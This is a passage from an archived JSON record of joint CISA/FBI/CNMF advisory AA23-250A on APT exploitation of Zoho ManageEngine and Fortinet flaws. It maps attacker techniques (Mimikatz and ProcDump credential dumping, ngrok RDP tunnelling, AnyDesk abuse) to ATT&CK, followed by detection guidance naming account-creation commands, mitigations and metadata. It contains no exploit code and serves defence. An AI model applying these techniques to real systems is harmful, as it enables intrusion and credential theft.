certificate issuers and hashes—none of which were the certified issuer.|\n|Hide Artifacts: Hidden Files and Directories|T1564.001|Actors used xpack.exe as a method for decrypting, loading, and executing accompanying files from a hidden directory.|\n|Hide Artifacts: Hidden Window|T1564.003|Actors used -w hidden to conceal PowerShell windows by setting the WindowStyle parameter to hidden.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n_Table 9: Credential Access_\n\n**Technique Title** **ID** **Use**\n\nOS Credential Actors created three files as means for Mimikatz to\n[T1003](https://attack.mitre.org/versions/v13/techniques/T1003/)\nDumping dump/write credentials to disk on the ServiceDesk system.\n\nOS Credential Actors successfully accessed and dumped credentials\nDumping: LSASS [T1003.001](https://attack.mitre.org/versions/v13/techniques/T1003/001/) stored in the process memory of LSASS for the AD domain,\nMemory including with the use of ProcDump.\n\nOS Credential\n\nActors dumped sam.hiv to obtain information about users\n\nDumping: Security [T1003.002](https://attack.mitre.org/versions/v13/techniques/T1003/002/)\n\non the system.\n\nAccount Manager\n\n_Table 10: Discovery_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|OS Credential Dumping|T1003|Actors created three files as means for Mimikatz to dump/write credentials to disk on the ServiceDesk system.|\n|OS Credential Dumping: LSASS Memory|T1003.001|Actors successfully accessed and dumped credentials stored in the process memory of LSASS for the AD domain, including with the use of ProcDump.|\n|OS Credential Dumping: Security Account Manager|T1003.002|Actors dumped sam.hiv to obtain information about users on the system.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|System Network Connections Discovery|T1049|Quser.exe was executed to acquire information about user sessions on a Remote Desktop Session Host server.|\n|Query Registry|T1012|Actors dumped system.hiv and security.hiv to obtain information about the data used by the operating system.|\n|Remote System Discovery|T1018|Actors downloaded the legitimate file/application nmap.exe via the Azure user to conduct network information gathering efforts.|\n|Network Sniffing|T1040|Actors downloaded the legitimate file/application npcap.exe via the Azure user to conduct credential gathering efforts.|\n|Network Service Discovery|T1046|Actors executed DNS scanning at a web server and directed callback to the Interact.sh domain, which indicated the server was susceptible to a DNS-style attack.|\n|Process Discovery|T1057|ProcDump was created within the c:\\windows\\system32\\prc64.exe directory as a method for enumerating running processes/applications.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n_Table 11: Lateral Movement_\n\n**Technique Title** **ID** **Use**\n\nRemote Services:\n\nNgrok was used to establish an RDP connection with the\n\nRemote Desktop [T1021.001](https://attack.mitre.org/versions/v13/techniques/T1021/001/)\n\nServiceDesk system.\n\nProtocol\n\nLateral Tool Actors compromised one host and moved laterally to install\n[T1570](https://attack.mitre.org/versions/v13/techniques/T1570/)\nTransfer `anydesk.exe on two additional hosts.`\n\n_Table 12: Collection_\n\n**Technique Title** **ID** **Use**\n\nActors executed xpack.exe malware from a hidden\ndirectory. This malware was predominantly used to execute\n\nData Staged [T1074](https://attack.mitre.org/versions/v13/techniques/T1074/)\n\nsystem commands, drop additional malware and tools, and\nstage data for exfiltration.\n\n_Table 13: Command and Control_\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Remote Services: Remote Desktop Protocol|T1021.001|Ngrok was used to establish an RDP connection with the ServiceDesk system.|\n|Lateral Tool Transfer|T1570|Actors compromised one host and moved laterally to install anydesk.exe on two additional hosts.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Data Staged|T1074|Actors executed xpack.exe malware from a hidden directory. This malware was predominantly used to execute system commands, drop additional malware and tools, and stage data for exfiltration.|\n\n|Technique Title|ID|Use|\n|---|---|---|\n|Application Layer Protocol: Web Protocols|T1071.001|Hello World User-Agent string was identified in a HTTP request. Communication occurred between the organization’s web server and an actor-controlled C2 IP address.|\n|Remote Access Software|T1219|Actors leveraged ConnectWise ScreenConnect to connect to the ServiceDesk system. Anydesk.exe was run on at least three different hosts in the environment.|\n|Non-Standard Port|T1571|Actors initiated multiple TLS-encrypted sessions on non- standard TCP port 10443.|\n|Protocol Tunneling|T1572|Using Ngrok as an external service, actors were able to gain access to and use the command line on victim systems via RDP.|\n|Encrypted Channel: Asymmetric Cryptography|T1573.002|Actors initiated multiple TLS-encrypted sessions on TCP port 10443, indicating successful exchanges of data transfer from the firewall device.|\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n## DETECTION METHODS\n\nCISA and co-sealers recommend reviewing Tables 3-13: Identified ATT&CK Techniques for\nEnterprise in conjunction with the detections in this section to identify similar activity.\n\n     - **[Enable logging for new user creation [DS0002], as well as monitor executed commands](https://attack.mitre.org/versions/v13/datasources/DS0002/)**\nand arguments for actions that are associated with local account creation, such as net user\n```\n      /add, useradd, and dscl -create [DS0017].\n\n```\n     - **Monitor for newly constructed scheduled tasks by enabling the \"Microsoft-Windows-**\nTaskScheduler/Operational\" setting within the event logging service. Monitor for changes\nmade to scheduled tasks that may attempt to manipulate features of their artifacts to make\n[them appear legitimate or benign to users and/or security tools [DS0003].](https://attack.mitre.org/versions/v13/datasources/DS0003/)\n\n     - **Monitor for API calls that may create or modify Windows services (ex:**\n```\n      CreateServiceW()) to repeatedly execute malicious payloads as part of persistence\n\n```\n[[DS0009].](https://attack.mitre.org/versions/v13/datasources/DS0009/)\n\n     - **Monitor executed commands and arguments that may attempt to access credential**\n**[material stored in the process memory of the LSASS [DS0017].](https://attack.mitre.org/versions/v13/datasources/DS0017/)**\n\n     - **Monitor for user accounts logged into systems associated with RDP (ex: Windows EID**\n[4624 Logon Type 10) [DS0028].](https://attack.mitre.org/versions/v13/datasources/DS0028/)\n\n     - **Monitor for newly-constructed network connections associated with pings/scans that**\nmay attempt to collect a listing of other systems by IP address, hostname, or other logical\nidentifier on a network that may be used for lateral movement from the current system\n\n[[DS0029].](https://attack.mitre.org/versions/v13/datasources/DS0029/)\n\n     - **Conduct full port scans (1-65535)** **on internet-facing systems—not just a subset of the**\nports.\n\n## MITIGATIONS\n\n**Note: These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs)**\ndeveloped by CISA and the National Institute of Standards and Technology (NIST). The CPGs\nprovide a minimum set of practices and protections that CISA and NIST recommend all organizations\nimplement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to\nprotect against the most common and impactful threats, tactics, techniques, and procedures. Visit\n[CISA’s Cross-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals) for more information on the CPGs, including\nadditional recommended baseline protections.\n\n### Manage Vulnerabilities and Configurations [CPG 1.E, CPG 3.A]\n\nCISA and co-sealers identified that exploitation of CVE-2022-47966 granted initial access to the\npublic-facing application, Zoho ManageEngine ServiceDesk Plus. Multiple Zoho ManageEngine onpremises products, such as ServiceDesk Plus through 14003, allow remote code execution due to\nuse of version 1.4.1 of Apache XML Security for Java (also known as xmlsec) from the Apache\nSantuario project. Due to the xmlsec XSLT features by design in that version, the application is\nresponsible for certain security protections. CISA and co-sealers recommend the following:\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n     - **[Document device configurations [CPG 2.O]. Organizations should maintain updated](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)**\ndocumentation describing the current configuration details of all critical IT assets (and OT,\nwhere applicable), as this facilitates more effective vulnerability and response activities.\n\n     - **Keep all software up to date and patch systems for known exploited vulnerabilities.** In\nplaces with known exploited vulnerabilities on an endpoint device (e.g., firewall security\n[appliances), conduct investigation prior to patching [CPG 1.E].](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)\n\n     - **[Follow a routine patching cycle [M1051] for all operating systems, applications, and](https://attack.mitre.org/versions/v13/mitigations/M1051/)**\nsoftware (including all third-party software) to mitigate the potential for exploitation.\n\n     - **Prioritize remediation of vulnerabilities on internet-facing systems, for example, by**\n[conducting continuous automated and/or routine vulnerability scans [M1016]. CISA offers a](https://attack.mitre.org/versions/v13/mitigations/M1016/)\nrange of services at no cost, including scanning and testing to help organizations reduce\n[exposure to threats via mitigating attack vectors. Specifically, Cyber Hygiene services can](https://www.cisa.gov/topics/cyber-threats-and-advisories/cyber-hygiene-services)\nhelp provide a second-set of eyes on organizations' internet-accessible assets. Organizations\n[can email vulnerability@cisa.dhs.gov](mailto:vulnerability@cisa.dhs.gov?subject=Requesting%20Cyber%20Hygiene%20Services) with the subject line, “Requesting Cyber Hygiene\nServices” to get started. For additional guidance on remediating these vulnerabilities,\nsee [CISA Insights - Remediate Vulnerabilities for Internet-Accessible Systems.](https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf)\n\n     - **[Deploy security.txt files [CPG 4.C]. All public-facing web domains have a security.txt file that](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)**\n[conforms to the recommendations in RFC 9116.[9]](https://datatracker.ietf.org/doc/rfc9116/)\n\n### Segment Networks [CPG 2.F]\n\nCISA and co-sealers identified that the organization did not employ proper network segmentation,\nsuch as a demilitarized zone (DMZ), during the initial discovery phase of the incident response. A\nDMZ serves as a perimeter network that protects and adds an extra layer of security to an\norganization’s internal local area network (LAN) from untrusted traffic.\n\n     - **Employ proper network segmentation, such as a DMZ, and ensure to address the**\nfollowing recommendations. Note: The end goal of a DMZ network is to allow an organization\nto access untrusted networks, such as the internet, while ensuring its private network or LAN\nremains secure. Organizations typically store external-facing services and resources, as well\nas servers for DNS, File Transfer Protocol (FTP), mail, proxy, Voice over Internet Protocol\n[(VoIP), and web servers in the DMZ [CPG 2.K,](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf) [CPG 2.W].](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)\n```\n        o Limit internet-facing port exposure for critical resources in the DMZ networks.\n        o Limit exposed ports to only required IP addresses and avoid placing wildcards in\n\n```\ndestination port or host entries.\n```\n        o Ensure unsecured protocols like FTP and HTTP are limited in use and restricted to\n\n```\nspecific IP ranges.\n```\n        o If data flows from untrusted zone to trusted zone, ensure it is conducted over a secure\n\n```\nprotocol like HTTPS with mandatory multi-factor authentication.\n\n     - **Use a firewall or web-application firewall (WAF) and enable logging to prevent/detect**\n[potential exploitation attempts [M1050]. Review ingress and egress firewall rules and block all](https://attack.mitre.org/versions/v13/mitigations/M1050/)\nunapproved protocols. Limit risky (but approved) protocols through rules.\n```\n        o Use WAF to limit exposure to just approved ports, as well as monitor file changes in\n\n```\nweb directories.\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n     - **Implement network segmentation to separate network segments based on role and**\n**functionality. Proper network segmentation significantly reduces the ability for threat actor**\nlateral movement by controlling traffic flows between—and access to—various subnetworks.\n[See CISA’s Layering Network Security Through Segmentation](https://www.cisa.gov/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf) infographic and the National\n[Security Agency’s (NSA’s) Segment Networks and Deploy Application-Aware Defenses.](https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf)\n\n### Manage Accounts, Permissions, and Workstations\n\nAPT actors were able to leverage disabled administrative accounts, as well as clear logs on several\ncritical servers, which prevented the ability to detect follow-on exploitation or data exfiltration. CISA\nand co-sealers recommend the following:\n\n     - **[Use phishing-resistant multi-factor authentication (MFA) [CPG 2.H] (e.g., security tokens)](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)**\nfor remote access and access to any sensitive data repositories. Implement phishing-resistant\nMFA for as many services possible—particularly for webmail and VPNs—for accounts that\naccess critical systems and privileged accounts that manage backups. MFA should also be\n[used for remote logins [M1032]. For additional guidance on secure MFA configurations, visit](https://attack.mitre.org/versions/v13/mitigations/M1032/)\n[cisa.gov/MFA](https://www.cisa.gov/MFA) [and CISA’s Implementing Phishing-Resistant MFA](https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf) Factsheet.\n\n     - **Employ strong password management alongside other attribute-based information, such as**\ndevice information, time of access, user history, and geolocation data. Set a password policy\nto require complex passwords for all users (minimum of 16 characters) and enforce this new\n[requirement as users’ passwords expire [CPG 2.A, CPG 2.B, CPG 2.C].](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)\n\n     - **Implement the principle of least privilege to decrease threat actors’ abilities to access key**\nnetwork resources.\n\n     - **Limit the ability of a local administrator account to log in from a local interactive**\n**[session [CPG 2.E] (e.g., “Deny access to this computer from the network”) and prevent](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)**\naccess via an RDP session.\n\n     - **Establish policy and procedure for the prompt removal of unnecessary (disabled)**\n**accounts and groups from the enterprise that are no longer needed, especially privileged**\naccounts. Implement and enforce use of Local Administrator Password Solution (LAPS).\n\n     - **Control and limit local administration, ensuring administrative users do not have access to**\nother systems outside of the local machine and across the domain.\n\n     - **Create a change control process for all privilege escalations and role changes on user**\naccounts. Enable alerts on privilege escalations and role changes, as well as log privileged\nuser changes in the network environment and create alerts for abnormal events.\n\n     - **Create and deploy a secure system baseline image to all workstations. See Microsoft’s**\n[guidance on Using Security Baselines in Your Organization.](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines)\n\n     - **[Implement policies to block workstation-to-workstation RDP connections [CPG 2.V]](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)**\nthrough a Group Policy Object on Windows, or by a similar mechanism. The RDP service\n[should be disabled if it is unnecessary [M1042].](https://attack.mitre.org/versions/v13/mitigations/M1042/)\n\n### Secure Remote Access Software\n\nRemote access software provides a proactive and flexible approach for organizations to internally\noversee networks, computers, and other devices; however, cyber threat actors increasingly co-opt\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\nthese tools for access to victim systems. APT actors were observed using legitimate remote access\ntools—ConnectWise ScreenConnect and AnyDesk—to connect to victim hosts within the\norganization’s environment and further conduct malicious operations. CISA and co-sealers\nrecommend the following:\n\n     - **[Establish a software behavior baseline to detect anomalies in behavior [CPG 2.T,](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)** [CPG](https://www.cisa.gov/sites/default/files/2023-03/CISA_CPG_REPORT_v1.0.1_FINAL.pdf)\n2.U].\n\n     - **Monitor for unauthorized use of remote access software using endpoint detection tools.**\n\nFor more information, see CISA’s joint [Guide to Securing Remote Access Software](https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software) on best practices\nfor using remote capabilities and how to detect and defend against malicious actors abusing this\nsoftware.\n\n### Other Best Practice Mitigation Recommendations\n\n     - **Use application allowlists on domain controllers, administrative hosts, and other sensitive**\nsystems. Following exploitation of the public-facing application (Zoho ManageEngine\nServiceDesk Plus), APT actors were able to download and execute multiple files on the\nsystem, which were then utilized to enumerate the network and perform reconnaissance\noperations.\n\n`o` **Use directory allowlisting rather than attempting to list every possible permutation of**\napplications in a network environment. Safe defaults allow applications to run from\n```\n         PROGRAMFILES, PROGRAMFILES(X86), and SYSTEM32. Disallow all other locations\n\n```\nunless an exception is granted and documented. Application directory allowlisting can\nbe enabled through Microsoft Software Restriction Policy or AppLocker and can\nprevent the execution of unauthorized software.\n\n     - **Audit scheduled tasks and validate all findings via a Group Policy Object (GPO) or**\nendpoint detection and response (EDR) solution.\n\n     - [Follow Microsoft’s Best Practices for Securing Active Directory.](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)\n\n     - [Review NSA’s Network Infrastructure Security Guide.](https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2949885/nsa-details-network-infrastructure-best-practices/)\n\n## VALIDATE SECURITY CONTROLS\n\nIn addition to applying mitigations, CISA and co-sealers recommend exercising, testing, and\nvalidating your organization's security program against the threat behaviors mapped to the MITRE\nATT&CK for Enterprise framework in this advisory. CISA and co-sealers also recommend testing your\nexisting security controls inventory to assess how they perform against the ATT&CK techniques\ndescribed in this advisory.\n\nTo get started:\n\n1. Select an ATT&CK technique described in this advisory (see Tables 3-13).\n2. Align your security technologies against the technique.\n3. Test your technologies against the technique.\n4. Analyze your detection and prevention technologies performance.\n5. Repeat the process for all security technologies to obtain a set of comprehensive performance\ndata.\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n6. Tune your security program, including people, processes, and technologies, based on the\ndata generated by this process.\n\nCISA and co-sealers recommend continually testing your security program, at scale, in a production\nenvironment to ensure optimal performance against the MITRE ATT&CK techniques identified in this\nadvisory.\n\n## RESOURCES\n\n     - [NIST: NVD CVE-2022-47966](https://nvd.nist.gov/vuln/detail/CVE-2022-47966)\n\n     - [NIST: NVD CVE-2022-42475](https://nvd.nist.gov/vuln/detail/CVE-2022-42475)\n\n     - [CISA: KEV List](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)\n\n     - [MITRE ATT&CK for Enterprise v13.1](https://attack.mitre.org/versions/v13/matrices/enterprise/)\n\n     - [CISA, MITRE: Best Practices for MITRE ATT&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping)\n\n     - [CISA: Decider Tool](https://github.com/cisagov/Decider/)\n\n     - [CISA: Cross-Sector Cybersecurity Performance Goals](https://www.cisa.gov/cross-sector-cybersecurity-performance-goals)\n\n     - [CISA: Cyber Hygiene Services](https://www.cisa.gov/topics/cyber-threats-and-advisories/cyber-hygiene-services)\n\n     - [CISA: Remediate Vulnerabilities for Internet-Accessible Systems](https://www.cisa.gov/sites/default/files/publications/CISAInsights-Cyber-RemediateVulnerabilitiesforInternetAccessibleSystems_S508C.pdf)\n\n     - [CISA: Layering Network Security Through Segmentation](https://www.cisa.gov/sites/default/files/publications/layering-network-security-segmentation_infographic_508_0.pdf)\n\n     - [NSA: Segment Networks and Deploy Application-Aware Defenses](https://media.defense.gov/2019/Sep/09/2002180325/-1/-1/0/Segment%20Networks%20and%20Deploy%20Application%20Aware%20Defenses%20-%20Copy.pdf)\n\n     - [CISA: MFA](https://www.cisa.gov/MFA)\n\n     - [CISA: Implementing Phishing-Resistant MFA](https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf)\n\n     - [Microsoft: Using Security Baselines in Your Organization](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines)\n\n     - [CISA: Guide to Securing Remote Access Software](https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software)\n\n     - [Microsoft: Best Practices for Securing Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)\n\n     - [NSA: Network Infrastructure Security Guide](https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2949885/nsa-details-network-infrastructure-best-practices/)\n\n## DISCLAIMER\n\nThe information in this report is being provided “as is” for informational purposes only. CISA, the FBI,\nand CNMF do not endorse any commercial entity, product, company, or service, including any\nentities, products, or services linked within this document. Any reference to specific commercial\nentities, products, processes, or services by service mark, trademark, manufacturer, or otherwise,\ndoes not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, or CNMF.\n\n## REFERENCES\n\n[1] [Snort: Known Malicious User-Agent String – Mirai](https://snort.org/rule_docs/1-58992)\n\n[2] [MITRE: Mimikatz](https://attack.mitre.org/versions/v13/software/S0002/)\n\n[3] [MITRE: Ngrok](https://attack.mitre.org/versions/v11/software/S0508/)\n\n[4] [AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a)\n\n[Crypto Miner, Credential Harvester](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a)\n\n[5] [AA22-294A: #StopRansomware: Daixin Team](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-294a)\n\n[6] [AA23-075A: #StopRansomware: LockBit 3.0](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n[7] [GitHub: Interactsh](https://github.com/projectdiscovery/interactsh)\n\n[8] [Microsoft: Quser](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/quser)\n\n[9] [Internet Engineering Task Force (IETF): RFC 9116](https://datatracker.ietf.org/doc/rfc9116/)\n\n## VERSION HISTORY\n\nSeptember 7, 2023: Initial version.\n\n\n**TLP:CLEAR** CISA | FBI | CNMF\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.cisa.gov/sites/default/files/2023-09/aa23-250a-apt-actors-exploit-cve-2022-47966-and-cve-2022-42475.pdf"
    ],
    "report_names": [
        "aa23-250a-apt-actors-exploit-cve-2022-47966-and-cve-2022-42475.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "86ab2e9a-75b1-48af-8313-0a5ec1f7d12c",
            "created_at": "2023-12-03T02:00:05.154685Z",
            "updated_at": "2025-03-27T02:00:03.261036Z",
            "deleted_at": null,
            "main_name": "Daixin Team",
            "aliases": [],
            "source_name": "MISPGALAXY:Daixin Team",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1694484375,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1694079404,
    "ts_modification_date": 1694079416,
    "files": {
        "pdf": "https://archive.orkl.eu/ecbbaa6877057b4b3de456ae279f69f1b2bacbae.pdf",
        "text": "https://archive.orkl.eu/ecbbaa6877057b4b3de456ae279f69f1b2bacbae.txt",
        "img": "https://archive.orkl.eu/ecbbaa6877057b4b3de456ae279f69f1b2bacbae.jpg"
    }
}